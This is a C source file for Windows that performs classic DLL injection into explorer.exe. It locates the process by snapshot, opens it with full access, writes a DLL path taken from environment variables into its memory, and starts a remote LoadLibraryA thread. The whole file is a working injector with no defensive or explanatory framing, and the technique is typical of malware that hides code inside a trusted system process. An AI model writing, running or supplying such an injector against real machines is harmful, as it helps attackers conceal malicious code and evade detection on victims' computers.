#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#include "../../stdlib/ICU_env.h"

DWORD GetExplorerPID() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, "explorer.exe") == 0) {
                DWORD pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return pid;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    char* ddl_paths = get_env_value("DLL_PATH");
    char* explorer_dll = get_env_value("DLL_EXPLORER");

    char dllPath[MAX_PATH];
    snprintf(dllPath, MAX_PATH, "%s\\%s", ddl_paths, explorer_dll);

    DWORD pid = GetExplorerPID();
    if (!pid) {
        printf("Failed to get PID explorer.exe\n");
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("Failed to open process: %lu\n", GetLastError());
        return 1;
    }

    LPVOID allocAddr = VirtualAllocEx(hProc, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!allocAddr) {
        printf("VirtualAllocEx error: %lu\n", GetLastError());
        return 1;
    }

    WriteProcessMemory(hProc, allocAddr, dllPath, strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), allocAddr, 0, NULL);
    if (!hThread) {
        printf("CreateRemoteThread error: %lu\n", GetLastError());
        return 1;
    }

    printf("Success inject dll to explorer.exe!\n");

    CloseHandle(hProc);
    return 0;
}
